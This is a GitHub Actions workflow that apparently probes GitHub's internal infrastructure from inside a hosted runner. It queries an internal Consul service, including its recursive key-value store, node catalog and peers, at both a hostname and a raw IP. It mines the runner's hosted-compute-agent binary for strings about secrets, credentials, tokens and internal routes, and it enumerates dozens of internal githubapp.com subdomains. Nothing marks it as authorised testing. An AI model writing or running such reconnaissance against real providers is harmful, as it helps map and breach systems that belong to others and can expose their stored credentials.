name: Consul and Binary Deep
on:
  workflow_dispatch:
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - name: Consul and binary analysis
        timeout-minutes: 8
        run: |
          set +e
          echo "=== CONSUL SERVICE ==="
          curl -sk --connect-timeout 5 https://consul.githubapp.com/ 2>&1 | head -20
          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/agent/self 2>&1 | head -10
          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/catalog/services 2>&1 | head -20
          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/catalog/nodes 2>&1 | head -20
          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/kv/?recurse 2>&1 | head -20
          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/status/leader 2>&1
          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/status/peers 2>&1
          curl -sk --connect-timeout 5 https://consul.githubapp.com/ui/ 2>&1 | head -10
          echo ""
          echo "=== CONSUL HTTP (port 8500) ==="
          curl -sk --connect-timeout 3 http://consul.githubapp.com:8500/v1/catalog/services 2>&1 | head -10
          curl -sk --connect-timeout 3 http://140.82.113.23:8500/v1/catalog/services 2>&1 | head -10
          echo ""
          echo "=== HCA BINARY DEEP STRINGS ==="
          strings /opt/hca/hosted-compute-agent | grep -iE 'consul|vault|nomad|etcd|redis|postgres|mysql|mongo|elastic|rabbit|kafka|nats' | sort -u | head -20
          echo ""
          echo "=== HCA BINARY CONFIG STRINGS ==="
          strings /opt/hca/hosted-compute-agent | grep -iE 'config|setting|env|secret|credential|password|apikey|endpoint|url.*=' | sort -u | head -30
          echo ""
          echo "=== HCA BINARY ERROR MESSAGES ==="
          strings /opt/hca/hosted-compute-agent | grep -iE 'error.*auth|error.*token|error.*attest|failed.*auth|failed.*token|invalid.*token|unsupported.*attest' | sort -u | head -20
          echo ""
          echo "=== HCA BINARY HTTP ROUTES ==="
          strings /opt/hca/hosted-compute-agent | grep -E '^/v[0-9]|^/api/|^/vm/|^/health|^/status|^/register|^/heartbeat|^/complete|^/cancel|^/trace|^/logs' | sort -u | head -30
          echo ""
          echo "=== HCA BINARY FUNCTION NAMES ==="
          strings /opt/hca/hosted-compute-agent | grep -E 'github.com/github/hosted-compute' | sort -u | head -40
          echo ""
          echo "=== OTHER GITHUBAPP SUBDOMAINS ==="
          for sub in consul vault nomad etcd redis kafka nats rabbitmq elasticsearch kibana grafana prometheus alertmanager jaeger zipkin loki tempo mimir pyroscope parca thanos cortex kiali argocd drone concourse buildkite render copilot actions cache artifacts runner codespace spark compute; do IP=$(dig +short $sub.githubapp.com 2>/dev/null | tail -1); [ -n "$IP" ] && echo "$sub.githubapp.com -> $IP"; done
          echo ""
          echo "=== DONE ==="
